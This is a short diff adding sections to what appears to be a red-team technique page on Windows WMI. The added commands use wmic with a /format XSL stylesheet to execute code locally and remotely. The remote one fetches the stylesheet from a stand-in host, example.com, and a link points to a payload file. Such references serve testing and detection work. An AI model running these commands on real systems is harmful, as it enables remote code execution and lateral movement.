@@ -23,6 +23,18 @@ Input:
 Input:
 
     get-wmiobject –class "win32_share" –namespace "root\CIMV2" –computer "targetname"
+    
+### Local Execution
+    
+    wmic os get /format:wmic.xsl
+
+### Remote Execution
+
+    wmic os get /format:"https://example.com/wmic.xsl"
+
+## Test Script
+
+[wmic.xsl](../Payloads/wmic.xsl)
 
 ### Lateral Movement
 
